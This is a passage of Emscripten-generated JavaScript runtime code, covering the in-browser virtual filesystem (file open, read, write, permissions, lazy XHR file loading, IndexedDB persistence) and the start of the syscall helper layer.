                                lchmod: function (path, mode) {
                                    FS.chmod(path, mode, !0);
                                },
                                fchmod: function (fd, mode) {
                                    var stream = FS.getStream(fd);
                                    if (!stream) throw new FS.ErrnoError(8);
                                    FS.chmod(stream.node, mode);
                                },
                                chown: function (path, uid, gid, dontFollow) {
                                    var node;
                                    if (!(node = "string" == typeof path ? FS.lookupPath(path, { follow: !dontFollow }).node : path).node_ops.setattr) throw new FS.ErrnoError(63);
                                    node.node_ops.setattr(node, { timestamp: Date.now() });
                                },
                                lchown: function (path, uid, gid) {
                                    FS.chown(path, uid, gid, !0);
                                },
                                fchown: function (fd, uid, gid) {
                                    var stream = FS.getStream(fd);
                                    if (!stream) throw new FS.ErrnoError(8);
                                    FS.chown(stream.node, uid, gid);
                                },
                                truncate: function (path, len) {
                                    if (len < 0) throw new FS.ErrnoError(28);
                                    var node;
                                    if (!(node = "string" == typeof path ? FS.lookupPath(path, { follow: !0 }).node : path).node_ops.setattr) throw new FS.ErrnoError(63);
                                    if (FS.isDir(node.mode)) throw new FS.ErrnoError(31);
                                    if (!FS.isFile(node.mode)) throw new FS.ErrnoError(28);
                                    var errCode = FS.nodePermissions(node, "w");
                                    if (errCode) throw new FS.ErrnoError(errCode);
                                    node.node_ops.setattr(node, { size: len, timestamp: Date.now() });
                                },
                                ftruncate: function (fd, len) {
                                    var stream = FS.getStream(fd);
                                    if (!stream) throw new FS.ErrnoError(8);
                                    if (0 == (2097155 & stream.flags)) throw new FS.ErrnoError(28);
                                    FS.truncate(stream.node, len);
                                },
                                utime: function (path, atime, mtime) {
                                    var node = FS.lookupPath(path, { follow: !0 }).node;
                                    node.node_ops.setattr(node, { timestamp: Math.max(atime, mtime) });
                                },
                                open: function (path, flags, mode, fd_start, fd_end) {
                                    if ("" === path) throw new FS.ErrnoError(44);
                                    var node;
                                    if (((mode = void 0 === mode ? 438 : mode), (mode = 64 & (flags = "string" == typeof flags ? FS.modeStringToFlags(flags) : flags) ? (4095 & mode) | 32768 : 0), "object" == typeof path)) node = path;
                                    else {
                                        path = PATH.normalize(path);
                                        try {
                                            node = FS.lookupPath(path, { follow: !(131072 & flags) }).node;
                                        } catch (e) {}
                                    }
                                    var created = !1;
                                    if (64 & flags)
                                        if (node) {
                                            if (128 & flags) throw new FS.ErrnoError(20);
                                        } else (node = FS.mknod(path, mode, 0)), (created = !0);
                                    if (!node) throw new FS.ErrnoError(44);
                                    if ((FS.isChrdev(node.mode) && (flags &= -513), 65536 & flags && !FS.isDir(node.mode))) throw new FS.ErrnoError(54);
                                    if (!created) {
                                        var errCode = FS.mayOpen(node, flags);
                                        if (errCode) throw new FS.ErrnoError(errCode);
                                    }
                                    512 & flags && FS.truncate(node, 0), (flags &= -131713);
                                    var stream = FS.createStream({ node: node, path: FS.getPath(node), flags: flags, seekable: !0, position: 0, stream_ops: node.stream_ops, ungotten: [], error: !1 }, fd_start, fd_end);
                                    stream.stream_ops.open && stream.stream_ops.open(stream),
                                        !Module.logReadFiles || 1 & flags || (FS.readFiles || (FS.readFiles = {}), path in FS.readFiles || ((FS.readFiles[path] = 1), err("FS.trackingDelegate error on read file: " + path)));
                                    try {
                                        if (FS.trackingDelegate.onOpenFile) {
                                            var trackingFlags = 0;
                                            1 != (2097155 & flags) && (trackingFlags |= FS.tracking.openFlags.READ),
                                                0 != (2097155 & flags) && (trackingFlags |= FS.tracking.openFlags.WRITE),
                                                FS.trackingDelegate.onOpenFile(path, trackingFlags);
                                        }
                                    } catch (e) {
                                        err("FS.trackingDelegate['onOpenFile']('" + path + "', flags) threw an exception: " + e.message);
                                    }
                                    return stream;
                                },
                                close: function (stream) {
                                    if (FS.isClosed(stream)) throw new FS.ErrnoError(8);
                                    stream.getdents && (stream.getdents = null);
                                    try {
                                        stream.stream_ops.close && stream.stream_ops.close(stream);
                                    } catch (e) {
                                        throw e;
                                    } finally {
                                        FS.closeStream(stream.fd);
                                    }
                                    stream.fd = null;
                                },
                                isClosed: function (stream) {
                                    return null === stream.fd;
                                },
                                llseek: function (stream, offset, whence) {
                                    if (FS.isClosed(stream)) throw new FS.ErrnoError(8);
                                    if (!stream.seekable || !stream.stream_ops.llseek) throw new FS.ErrnoError(70);
                                    if (0 != whence && 1 != whence && 2 != whence) throw new FS.ErrnoError(28);
                                    return (stream.position = stream.stream_ops.llseek(stream, offset, whence)), (stream.ungotten = []), stream.position;
                                },
                                read: function (stream, buffer, offset, length, position) {
                                    if (length < 0 || position < 0) throw new FS.ErrnoError(28);
                                    if (FS.isClosed(stream)) throw new FS.ErrnoError(8);
                                    if (1 == (2097155 & stream.flags)) throw new FS.ErrnoError(8);
                                    if (FS.isDir(stream.node.mode)) throw new FS.ErrnoError(31);
                                    if (!stream.stream_ops.read) throw new FS.ErrnoError(28);
                                    var seeking = void 0 !== position;
                                    if (seeking) {
                                        if (!stream.seekable) throw new FS.ErrnoError(70);
                                    } else position = stream.position;
                                    var bytesRead = stream.stream_ops.read(stream, buffer, offset, length, position);
                                    return seeking || (stream.position += bytesRead), bytesRead;
                                },
                                write: function (stream, buffer, offset, length, position, canOwn) {
                                    if (length < 0 || position < 0) throw new FS.ErrnoError(28);
                                    if (FS.isClosed(stream)) throw new FS.ErrnoError(8);
                                    if (0 == (2097155 & stream.flags)) throw new FS.ErrnoError(8);
                                    if (FS.isDir(stream.node.mode)) throw new FS.ErrnoError(31);
                                    if (!stream.stream_ops.write) throw new FS.ErrnoError(28);
                                    stream.seekable && 1024 & stream.flags && FS.llseek(stream, 0, 2);
                                    var seeking = void 0 !== position;
                                    if (seeking) {
                                        if (!stream.seekable) throw new FS.ErrnoError(70);
                                    } else position = stream.position;
                                    var bytesWritten = stream.stream_ops.write(stream, buffer, offset, length, position, canOwn);
                                    seeking || (stream.position += bytesWritten);
                                    try {
                                        stream.path && FS.trackingDelegate.onWriteToFile && FS.trackingDelegate.onWriteToFile(stream.path);
                                    } catch (e) {
                                        err("FS.trackingDelegate['onWriteToFile']('" + stream.path + "') threw an exception: " + e.message);
                                    }
                                    return bytesWritten;
                                },
                                allocate: function (stream, offset, length) {
                                    if (FS.isClosed(stream)) throw new FS.ErrnoError(8);
                                    if (offset < 0 || length <= 0) throw new FS.ErrnoError(28);
                                    if (0 == (2097155 & stream.flags)) throw new FS.ErrnoError(8);
                                    if (!FS.isFile(stream.node.mode) && !FS.isDir(stream.node.mode)) throw new FS.ErrnoError(43);
                                    if (!stream.stream_ops.allocate) throw new FS.ErrnoError(138);
                                    stream.stream_ops.allocate(stream, offset, length);
                                },
                                mmap: function (stream, address, length, position, prot, flags) {
                                    if (0 != (2 & prot) && 0 == (2 & flags) && 2 != (2097155 & stream.flags)) throw new FS.ErrnoError(2);
                                    if (1 == (2097155 & stream.flags)) throw new FS.ErrnoError(2);
                                    if (!stream.stream_ops.mmap) throw new FS.ErrnoError(43);
                                    return stream.stream_ops.mmap(stream, address, length, position, prot, flags);
                                },
                                msync: function (stream, buffer, offset, length, mmapFlags) {
                                    return stream && stream.stream_ops.msync ? stream.stream_ops.msync(stream, buffer, offset, length, mmapFlags) : 0;
                                },
                                munmap: function (stream) {
                                    return 0;
                                },
                                ioctl: function (stream, cmd, arg) {
                                    if (!stream.stream_ops.ioctl) throw new FS.ErrnoError(59);
                                    return stream.stream_ops.ioctl(stream, cmd, arg);
                                },
                                readFile: function (path, opts) {
                                    if ((((opts = opts || {}).flags = opts.flags || 0), (opts.encoding = opts.encoding || "binary"), "utf8" !== opts.encoding && "binary" !== opts.encoding))
                                        throw new Error('Invalid encoding type "' + opts.encoding + '"');
                                    var ret,
                                        stream = FS.open(path, opts.flags),
                                        length = FS.stat(path).size,
                                        buf = new Uint8Array(length);
                                    return FS.read(stream, buf, 0, length, 0), "utf8" === opts.encoding ? (ret = UTF8ArrayToString(buf, 0)) : "binary" === opts.encoding && (ret = buf), FS.close(stream), ret;
                                },
                                writeFile: function (path, data, opts) {
                                    (opts = opts || {}).flags = opts.flags || 577;
                                    var stream = FS.open(path, opts.flags, opts.mode);
                                    if ("string" == typeof data) {
                                        var buf = new Uint8Array(lengthBytesUTF8(data) + 1),
                                            actualNumBytes = stringToUTF8Array(data, buf, 0, buf.length);
                                        FS.write(stream, buf, 0, actualNumBytes, void 0, opts.canOwn);
                                    } else {
                                        if (!ArrayBuffer.isView(data)) throw new Error("Unsupported data type");
                                        FS.write(stream, data, 0, data.byteLength, void 0, opts.canOwn);
                                    }
                                    FS.close(stream);
                                },
                                cwd: function () {
                                    return FS.currentPath;
                                },
                                chdir: function (path) {
                                    var lookup = FS.lookupPath(path, { follow: !0 });
                                    if (null === lookup.node) throw new FS.ErrnoError(44);
                                    if (!FS.isDir(lookup.node.mode)) throw new FS.ErrnoError(54);
                                    var errCode = FS.nodePermissions(lookup.node, "x");
                                    if (errCode) throw new FS.ErrnoError(errCode);
                                    FS.currentPath = lookup.path;
                                },
                                createDefaultDirectories: function () {
                                    FS.mkdir("/tmp"), FS.mkdir("/home"), FS.mkdir("/home/web_user");
                                },
                                createDefaultDevices: function () {
                                    FS.mkdir("/dev"),
                                        FS.registerDevice(FS.makedev(1, 3), {
                                            read: function () {
                                                return 0;
                                            },
                                            write: function (stream, buffer, offset, length, pos) {
                                                return length;
                                            },
                                        }),
                                        FS.mkdev("/dev/null", FS.makedev(1, 3)),
                                        TTY.register(FS.makedev(5, 0), TTY.default_tty_ops),
                                        TTY.register(FS.makedev(6, 0), TTY.default_tty1_ops),
                                        FS.mkdev("/dev/tty", FS.makedev(5, 0)),
                                        FS.mkdev("/dev/tty1", FS.makedev(6, 0));
                                    var random_device = getRandomDevice();
                                    FS.createDevice("/dev", "random", random_device), FS.createDevice("/dev", "urandom", random_device), FS.mkdir("/dev/shm"), FS.mkdir("/dev/shm/tmp");
                                },
                                createSpecialDirectories: function () {
                                    FS.mkdir("/proc");
                                    var proc_self = FS.mkdir("/proc/self");
                                    FS.mkdir("/proc/self/fd"),
                                        FS.mount(
                                            {
                                                mount: function () {
                                                    var node = FS.createNode(proc_self, "fd", 16895, 73);
                                                    return (
                                                        (node.node_ops = {
                                                            lookup: function (parent, name) {
                                                                var fd = +name,
                                                                    stream = FS.getStream(fd);
                                                                if (!stream) throw new FS.ErrnoError(8);
                                                                var ret = {
                                                                    parent: null,
                                                                    mount: { mountpoint: "fake" },
                                                                    node_ops: {
                                                                        readlink: function () {
                                                                            return stream.path;
                                                                        },
                                                                    },
                                                                };
                                                                return (ret.parent = ret), ret;
                                                            },
                                                        }),
                                                        node
                                                    );
                                                },
                                            },
                                            {},
                                            "/proc/self/fd"
                                        );
                                },
                                createStandardStreams: function () {
                                    Module.stdin ? FS.createDevice("/dev", "stdin", Module.stdin) : FS.symlink("/dev/tty", "/dev/stdin"),
                                        Module.stdout ? FS.createDevice("/dev", "stdout", null, Module.stdout) : FS.symlink("/dev/tty", "/dev/stdout"),
                                        Module.stderr ? FS.createDevice("/dev", "stderr", null, Module.stderr) : FS.symlink("/dev/tty1", "/dev/stderr"),
                                        FS.open("/dev/stdin", 0),
                                        FS.open("/dev/stdout", 1),
                                        FS.open("/dev/stderr", 1);
                                },
                                ensureErrnoError: function () {
                                    FS.ErrnoError ||
                                        ((FS.ErrnoError = function (errno, node) {
                                            (this.node = node),
                                                (this.setErrno = function (errno) {
                                                    this.errno = errno;
                                                }),
                                                this.setErrno(errno),
                                                (this.message = "FS error");
                                        }),
                                        (FS.ErrnoError.prototype = new Error()),
                                        (FS.ErrnoError.prototype.constructor = FS.ErrnoError),
                                        [44].forEach(function (code) {
                                            (FS.genericErrors[code] = new FS.ErrnoError(code)), (FS.genericErrors[code].stack = "<generic error, no stack>");
                                        }));
                                },
                                staticInit: function () {
                                    FS.ensureErrnoError(),
                                        (FS.nameTable = new Array(4096)),
                                        FS.mount(MEMFS, {}, "/"),
                                        FS.createDefaultDirectories(),
                                        FS.createDefaultDevices(),
                                        FS.createSpecialDirectories(),
                                        (FS.filesystems = { MEMFS: MEMFS, IDBFS: IDBFS });
                                },
                                init: function (input, output, error) {
                                    (FS.init.initialized = !0), FS.ensureErrnoError(), (Module.stdin = input || Module.stdin), (Module.stdout = output || Module.stdout), (Module.stderr = error || Module.stderr), FS.createStandardStreams();
                                },
                                quit: function () {
                                    FS.init.initialized = !1;
                                    var fflush = Module._fflush;
                                    fflush && fflush(0);
                                    for (var i = 0; i < FS.streams.length; i++) {
                                        var stream = FS.streams[i];
                                        stream && FS.close(stream);
                                    }
                                },
                                getMode: function (canRead, canWrite) {
                                    var mode = 0;
                                    return canRead && (mode |= 365), canWrite && (mode |= 146), mode;
                                },
                                findObject: function (path, dontResolveLastLink) {
                                    var ret = FS.analyzePath(path, dontResolveLastLink);
                                    return ret.exists ? ret.object : null;
                                },
                                analyzePath: function (path, dontResolveLastLink) {
                                    try {
                                        path = (lookup = FS.lookupPath(path, { follow: !dontResolveLastLink })).path;
                                    } catch (e) {}
                                    var ret = { isRoot: !1, exists: !1, error: 0, name: null, path: null, object: null, parentExists: !1, parentPath: null, parentObject: null };
                                    try {
                                        var lookup = FS.lookupPath(path, { parent: !0 });
                                        (ret.parentExists = !0),
                                            (ret.parentPath = lookup.path),
                                            (ret.parentObject = lookup.node),
                                            (ret.name = PATH.basename(path)),
                                            (lookup = FS.lookupPath(path, { follow: !dontResolveLastLink })),
                                            (ret.exists = !0),
                                            (ret.path = lookup.path),
                                            (ret.object = lookup.node),
                                            (ret.name = lookup.node.name),
                                            (ret.isRoot = "/" === lookup.path);
                                    } catch (e) {
                                        ret.error = e.errno;
                                    }
                                    return ret;
                                },
                                createPath: function (parent, path, canRead, canWrite) {
                                    parent = "string" == typeof parent ? parent : FS.getPath(parent);
                                    for (var parts = path.split("/").reverse(); parts.length; ) {
                                        var part = parts.pop();
                                        if (part) {
                                            var current = PATH.join2(parent, part);
                                            try {
                                                FS.mkdir(current);
                                            } catch (e) {}
                                            parent = current;
                                        }
                                    }
                                    return current;
                                },
                                createFile: function (parent, name, properties, canRead, canWrite) {
                                    var path = PATH.join2("string" == typeof parent ? parent : FS.getPath(parent), name),
                                        mode = FS.getMode(canRead, canWrite);
                                    return FS.create(path, mode);
                                },
                                createDataFile: function (parent, name, data, canRead, canWrite, canOwn) {
                                    var path = name ? PATH.join2("string" == typeof parent ? parent : FS.getPath(parent), name) : parent,
                                        mode = FS.getMode(canRead, canWrite),
                                        node = FS.create(path, mode);
                                    if (data) {
                                        if ("string" == typeof data) {
                                            for (var arr = new Array(data.length), i = 0, len = data.length; i < len; ++i) arr[i] = data.charCodeAt(i);
                                            data = arr;
                                        }
                                        FS.chmod(node, 146 | mode);
                                        var stream = FS.open(node, 577);
                                        FS.write(stream, data, 0, data.length, 0, canOwn), FS.close(stream), FS.chmod(node, mode);
                                    }
                                    return node;
                                },
                                createDevice: function (parent, name, input, output) {
                                    var path = PATH.join2("string" == typeof parent ? parent : FS.getPath(parent), name),
                                        mode = FS.getMode(!!input, !!output);
                                    FS.createDevice.major || (FS.createDevice.major = 64);
                                    var dev = FS.makedev(FS.createDevice.major++, 0);
                                    return (
                                        FS.registerDevice(dev, {
                                            open: function (stream) {
                                                stream.seekable = !1;
                                            },
                                            close: function (stream) {
                                                output && output.buffer && output.buffer.length && output(10);
                                            },
                                            read: function (stream, buffer, offset, length, pos) {
                                                for (var bytesRead = 0, i = 0; i < length; i++) {
                                                    var result;
                                                    try {
                                                        result = input();
                                                    } catch (e) {
                                                        throw new FS.ErrnoError(29);
                                                    }
                                                    if (void 0 === result && 0 === bytesRead) throw new FS.ErrnoError(6);
                                                    if (null == result) break;
                                                    bytesRead++, (buffer[offset + i] = result);
                                                }
                                                return bytesRead && (stream.node.timestamp = Date.now()), bytesRead;
                                            },
                                            write: function (stream, buffer, offset, length, pos) {
                                                for (var i = 0; i < length; i++)
                                                    try {
                                                        output(buffer[offset + i]);
                                                    } catch (e) {
                                                        throw new FS.ErrnoError(29);
                                                    }
                                                return length && (stream.node.timestamp = Date.now()), i;
                                            },
                                        }),
                                        FS.mkdev(path, mode, dev)
                                    );
                                },
                                forceLoadFile: function (obj) {
                                    if (obj.isDevice || obj.isFolder || obj.link || obj.contents) return !0;
                                    if ("undefined" != typeof XMLHttpRequest)
                                        throw new Error(
                                            "Lazy loading should have been performed (contents set) in createLazyFile, but it was not. Lazy loading only works in web workers. Use --embed-file or --preload-file in emcc on the main thread."
                                        );
                                    if (!read_) throw new Error("Cannot load without read() or XMLHttpRequest.");
                                    try {
                                        (obj.contents = intArrayFromString(read_(obj.url), !0)), (obj.usedBytes = obj.contents.length);
                                    } catch (e) {
                                        throw new FS.ErrnoError(29);
                                    }
                                },
                                createLazyFile: function (parent, name, url, canRead, canWrite) {
                                    function LazyUint8Array() {
                                        (this.lengthKnown = !1), (this.chunks = []);
                                    }
                                    if (
                                        ((LazyUint8Array.prototype.get = function (idx) {
                                            if (!(idx > this.length - 1 || idx < 0)) {
                                                var chunkOffset = idx % this.chunkSize,
                                                    chunkNum = (idx / this.chunkSize) | 0;
                                                return this.getter(chunkNum)[chunkOffset];
                                            }
                                        }),
                                        (LazyUint8Array.prototype.setDataGetter = function (getter) {
                                            this.getter = getter;
                                        }),
                                        (LazyUint8Array.prototype.cacheLength = function () {
                                            var xhr = new XMLHttpRequest();
                                            if ((xhr.open("HEAD", url, !1), xhr.send(null), !((xhr.status >= 200 && xhr.status < 300) || 304 === xhr.status))) throw new Error("Couldn't load " + url + ". Status: " + xhr.status);
                                            var header,
                                                datalength = Number(xhr.getResponseHeader("Content-length")),
                                                hasByteServing = (header = xhr.getResponseHeader("Accept-Ranges")) && "bytes" === header,
                                                usesGzip = (header = xhr.getResponseHeader("Content-Encoding")) && "gzip" === header,
                                                chunkSize = 1048576;
                                            hasByteServing || (chunkSize = datalength);
                                            var lazyArray = this;
                                            lazyArray.setDataGetter(function (chunkNum) {
                                                var start = chunkNum * chunkSize,
                                                    end = (chunkNum + 1) * chunkSize - 1;
                                                if (
                                                    ((end = Math.min(end, datalength - 1)),
                                                    void 0 === lazyArray.chunks[chunkNum] &&
                                                        (lazyArray.chunks[chunkNum] = (function (from, to) {
                                                            if (from > to) throw new Error("invalid range (" + from + ", " + to + ") or no bytes requested!");
                                                            if (to > datalength - 1) throw new Error("only " + datalength + " bytes available! programmer error!");
                                                            var xhr = new XMLHttpRequest();
                                                            if (
                                                                (xhr.open("GET", url, !1),
                                                                datalength !== chunkSize && xhr.setRequestHeader("Range", "bytes=" + from + "-" + to),
                                                                "undefined" != typeof Uint8Array && (xhr.responseType = "arraybuffer"),
                                                                xhr.overrideMimeType && xhr.overrideMimeType("text/plain; charset=x-user-defined"),
                                                                xhr.send(null),
                                                                !((xhr.status >= 200 && xhr.status < 300) || 304 === xhr.status))
                                                            )
                                                                throw new Error("Couldn't load " + url + ". Status: " + xhr.status);
                                                            return void 0 !== xhr.response ? new Uint8Array(xhr.response || []) : intArrayFromString(xhr.responseText || "", !0);
                                                        })(start, end)),
                                                    void 0 === lazyArray.chunks[chunkNum])
                                                )
                                                    throw new Error("doXHR failed!");
                                                return lazyArray.chunks[chunkNum];
                                            }),
                                                (!usesGzip && datalength) ||
                                                    ((chunkSize = datalength = 1), (datalength = this.getter(0).length), (chunkSize = datalength), out("LazyFiles on gzip forces download of the whole file when length is accessed")),
                                                (this._length = datalength),
                                                (this._chunkSize = chunkSize),
                                                (this.lengthKnown = !0);
                                        }),
                                        "undefined" != typeof XMLHttpRequest)
                                    ) {
                                        if (!ENVIRONMENT_IS_WORKER) throw "Cannot do synchronous binary XHRs outside webworkers in modern browsers. Use --embed-file or --preload-file in emcc";
                                        var lazyArray = new LazyUint8Array();
                                        Object.defineProperties(lazyArray, {
                                            length: {
                                                get: function () {
                                                    return this.lengthKnown || this.cacheLength(), this._length;
                                                },
                                            },
                                            chunkSize: {
                                                get: function () {
                                                    return this.lengthKnown || this.cacheLength(), this._chunkSize;
                                                },
                                            },
                                        });
                                        var properties = { isDevice: !1, contents: lazyArray };
                                    } else properties = { isDevice: !1, url: url };
                                    var node = FS.createFile(parent, name, properties, canRead, canWrite);
                                    properties.contents ? (node.contents = properties.contents) : properties.url && ((node.contents = null), (node.url = properties.url)),
                                        Object.defineProperties(node, {
                                            usedBytes: {
                                                get: function () {
                                                    return this.contents.length;
                                                },
                                            },
                                        });
                                    var stream_ops = {};
                                    return (
                                        Object.keys(node.stream_ops).forEach(function (key) {
                                            var fn = node.stream_ops[key];
                                            stream_ops[key] = function () {
                                                return FS.forceLoadFile(node), fn.apply(null, arguments);
                                            };
                                        }),
                                        (stream_ops.read = function (stream, buffer, offset, length, position) {
                                            FS.forceLoadFile(node);
                                            var contents = stream.node.contents;
                                            if (position >= contents.length) return 0;
                                            var size = Math.min(contents.length - position, length);
                                            if (contents.slice) for (var i = 0; i < size; i++) buffer[offset + i] = contents[position + i];
                                            else for (i = 0; i < size; i++) buffer[offset + i] = contents.get(position + i);
                                            return size;
                                        }),
                                        (node.stream_ops = stream_ops),
                                        node
                                    );
                                },
                                createPreloadedFile: function (parent, name, url, canRead, canWrite, onload, onerror, dontCreateFile, canOwn, preFinish) {
                                    Browser.init();
                                    var fullname = name ? PATH_FS.resolve(PATH.join2(parent, name)) : parent;
                                    function processData(byteArray) {
                                        function finish(byteArray) {
                                            preFinish && preFinish(), dontCreateFile || FS.createDataFile(parent, name, byteArray, canRead, canWrite, canOwn), onload && onload(), removeRunDependency();
                                        }
                                        var handled = !1;
                                        Module.preloadPlugins.forEach(function (plugin) {
                                            handled ||
                                                (plugin.canHandle(fullname) &&
                                                    (plugin.handle(byteArray, fullname, finish, function () {
                                                        onerror && onerror(), removeRunDependency();
                                                    }),
                                                    (handled = !0)));
                                        }),
                                            handled || finish(byteArray);
                                    }
                                    addRunDependency(),
                                        "string" == typeof url
                                            ? Browser.asyncLoad(
                                                  url,
                                                  function (byteArray) {
                                                      processData(byteArray);
                                                  },
                                                  onerror
                                              )
                                            : processData(url);
                                },
                                indexedDB: function () {
                                    return window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
                                },
                                DB_NAME: function () {
                                    return "EM_FS_" + window.location.pathname;
                                },
                                DB_VERSION: 20,
                                DB_STORE_NAME: "FILE_DATA",
                                saveFilesToDB: function (paths, onload, onerror) {
                                    (onload = onload || function () {}), (onerror = onerror || function () {});
                                    var indexedDB = FS.indexedDB();
                                    try {
                                        var openRequest = indexedDB.open(FS.DB_NAME(), FS.DB_VERSION);
                                    } catch (e) {
                                        return onerror(e);
                                    }
                                    (openRequest.onupgradeneeded = function () {
                                        out("creating db"), openRequest.result.createObjectStore(FS.DB_STORE_NAME);
                                    }),
                                        (openRequest.onsuccess = function () {
                                            var transaction = openRequest.result.transaction([FS.DB_STORE_NAME], "readwrite"),
                                                files = transaction.objectStore(FS.DB_STORE_NAME),
                                                ok = 0,
                                                fail = 0,
                                                total = paths.length;
                                            function finish() {
                                                0 == fail ? onload() : onerror();
                                            }
                                            paths.forEach(function (path) {
                                                var putRequest = files.put(FS.analyzePath(path).object.contents, path);
                                                (putRequest.onsuccess = function () {
                                                    ++ok + fail == total && finish();
                                                }),
                                                    (putRequest.onerror = function () {
                                                        fail++, ok + fail == total && finish();
                                                    });
                                            }),
                                                (transaction.onerror = onerror);
                                        }),
                                        (openRequest.onerror = onerror);
                                },
                                loadFilesFromDB: function (paths, onload, onerror) {
                                    (onload = onload || function () {}), (onerror = onerror || function () {});
                                    var indexedDB = FS.indexedDB();
                                    try {
                                        var openRequest = indexedDB.open(FS.DB_NAME(), FS.DB_VERSION);
                                    } catch (e) {
                                        return onerror(e);
                                    }
                                    (openRequest.onupgradeneeded = onerror),
                                        (openRequest.onsuccess = function () {
                                            var db = openRequest.result;
                                            try {
                                                var transaction = db.transaction([FS.DB_STORE_NAME], "readonly");
                                            } catch (e) {
                                                return void onerror(e);
                                            }
                                            var files = transaction.objectStore(FS.DB_STORE_NAME),
                                                ok = 0,
                                                fail = 0,
                                                total = paths.length;
                                            function finish() {
                                                0 == fail ? onload() : onerror();
                                            }
                                            paths.forEach(function (path) {
                                                var getRequest = files.get(path);
                                                (getRequest.onsuccess = function () {
                                                    FS.analyzePath(path).exists && FS.unlink(path), FS.createDataFile(PATH.dirname(path), PATH.basename(path), getRequest.result, !0, !0, !0), ++ok + fail == total && finish();
                                                }),
                                                    (getRequest.onerror = function () {
                                                        fail++, ok + fail == total && finish();
                                                    });
                                            }),
                                                (transaction.onerror = onerror);
                                        }),
                                        (openRequest.onerror = onerror);
                                },
                            },
                            SYSCALLS = {
                                mappings: {},
                                DEFAULT_POLLMASK: 5,
                                umask: 511,
                                calculateAt: function (dirfd, path, allowEmpty) {
                                    if ("/" === path[0]) return path;
                                    var dir;
                                    if (-100 === dirfd) dir = FS.cwd();
                                    else {
                                        var dirstream = FS.getStream(dirfd);
                                        if (!dirstream) throw new FS.ErrnoError(8);
                                        dir = dirstream.path;
                                    }
                                    if (0 == path.length) {
                                        if (!allowEmpty) throw new FS.ErrnoError(44);
                                        return dir;
                                    }
                                    return PATH.join2(dir, path);
                                },
                                doStat: function (func, path, buf) {
                                    try {
                                        var stat = func(path);
                                    } catch (e) {
                                        if (e && e.node && PATH.normalize(path) !== PATH.normalize(FS.getPath(e.node))) return -54;
                                        throw e;
                                    }
                                    return (
                                        (HEAP32[buf >> 2] = stat.dev),
                                        (HEAP32[(buf + 4) >> 2] = 0),
                                        (HEAP32[(buf + 8) >> 2] = stat.ino),
                                        (HEAP32[(buf + 12) >> 2] = stat.mode),
                                        (HEAP32[(buf + 16) >> 2] = stat.nlink),
                                        (HEAP32[(buf + 20) >> 2] = stat.uid),
                                        (HEAP32[(buf + 24) >> 2] = stat.gid),
                                        (HEAP32[(buf + 28) >> 2] = stat.rdev),
                                        (HEAP32[(buf + 32) >> 2] = 0),
                                        (tempI64 = [
                                            stat.size >>> 0,
                                            ((tempDouble = stat.size),
                                            +Math.abs(tempDouble) >= 1 ? (tempDouble > 0 ? (0 | Math.min(+Math.floor(tempDouble / 4294967296), 4294967295)) >>> 0 : ~~+Math.ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0) : 0),
                                        ]),
                                        (HEAP32[(buf + 40) >> 2] = tempI64[0]),
                                        (HEAP32[(buf + 44) >> 2] = tempI64[1]),
                                        (HEAP32[(buf + 48) >> 2] = 4096),
                                        (HEAP32[(buf + 52) >> 2] = stat.blocks),
                                        (HEAP32[(buf + 56) >> 2] = (stat.atime.getTime() / 1e3) | 0),
                                        (HEAP32[(buf + 60) >> 2] = 0),
                                        (HEAP32[(buf + 64) >> 2] = (stat.mtime.getTime() / 1e3) | 0),
                                        (HEAP32[(buf + 68) >> 2] = 0),
                                        (HEAP32[(buf + 72) >> 2] = (stat.ctime.getTime() / 1e3) | 0),
                                        (HEAP32[(buf + 76) >> 2] = 0),
                                        (tempI64 = [
                                            stat.ino >>> 0,
                                            ((tempDouble = stat.ino),
                                            +Math.abs(tempDouble) >= 1 ? (tempDouble > 0 ? (0 | Math.min(+Math.floor(tempDouble / 4294967296), 4294967295)) >>> 0 : ~~+Math.ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0) : 0),
                                        ]),
                                        (HEAP32[(buf + 80) >> 2] = tempI64[0]),
                                        (HEAP32[(buf + 84) >> 2] = tempI64[1]),
                                        0
                                    );
                                },
                                doMsync: function (addr, stream, len, flags, offset) {
                                    var buffer = HEAPU8.slice(addr, addr + len);
                                    FS.msync(stream, buffer, offset, len, flags);
                                },
                                doMkdir: function (path, mode) {
                                    return "/" === (path = PATH.normalize(path))[path.length - 1] && (path = path.substr(0, path.length - 1)), FS.mkdir(path, mode, 0), 0;
                                },
                                doMknod: function (path, mode, dev) {
                                    switch (61440 & mode) {
                                        case 32768:
                                        case 8192:
                                        case 24576:
                                        case 4096:
                                        case 49152:
                                            break;
                                        default:
                                            return -28;
                                    }
                                    return FS.mknod(path, mode, dev), 0;
                                },
                                doReadlink: function (path, buf, bufsize) {
                                    if (bufsize <= 0) return -28;
                                    var ret = FS.readlink(path),
                                        len = Math.min(bufsize, lengthBytesUTF8(ret)),
                                        endChar = HEAP8[buf + len];
                                    return stringToUTF8(ret, buf, bufsize + 1), (HEAP8[buf + len] = endChar), len;
                                },
                                doAccess: function (path, amode) {
                                    if (-8 & amode) return -28;
                                    var node;
                                    if (!(node = FS.lookupPath(path, { follow: !0 }).node)) return -44;
                                    var perms = "";
                                    return 4 & amode && (perms += "r"), 2 & amode && (perms += "w"), 1 & amode && (perms += "x"), perms && FS.nodePermissions(node, perms) ? -2 : 0;
                                },
                                doDup: function (path, flags, suggestFD) {
                                    var suggest = FS.getStream(suggestFD);
                                    return suggest && FS.close(suggest), FS.open(path, flags, 0, suggestFD, suggestFD).fd;
                                },
                                doReadv: function (stream, iov, iovcnt, offset) {
                                    for (var ret = 0, i = 0; i < iovcnt; i++) {
                                        var ptr = HEAP32[(iov + 8 * i) >> 2],
                                            len = HEAP32[(iov + (8 * i + 4)) >> 2],
                                            curr = FS.read(stream, HEAP8, ptr, len, offset);
                                        if (curr < 0) return -1;
                                        if (((ret += curr), curr < len)) break;
                                    }
                                    return ret;
                                },
                                doWritev: function (stream, iov, iovcnt, offset) {
                                    for (var ret = 0, i = 0; i < iovcnt; i++) {
                                        var ptr = HEAP32[(iov + 8 * i) >> 2],
                                            len = HEAP32[(iov + (8 * i + 4)) >> 2],
                                            curr = FS.write(stream, HEAP8, ptr, len, offset);
                                        if (curr < 0) return -1;
                                        ret += curr;
                                    }
                                    return ret;
                                },
                                varargs: void 0,
                                get: function () {
                                    return (SYSCALLS.varargs += 4), HEAP32[(SYSCALLS.varargs - 4) >> 2];
                                },
                                getStr: function (ptr) {
                                    return UTF8ToString(ptr);
                                },
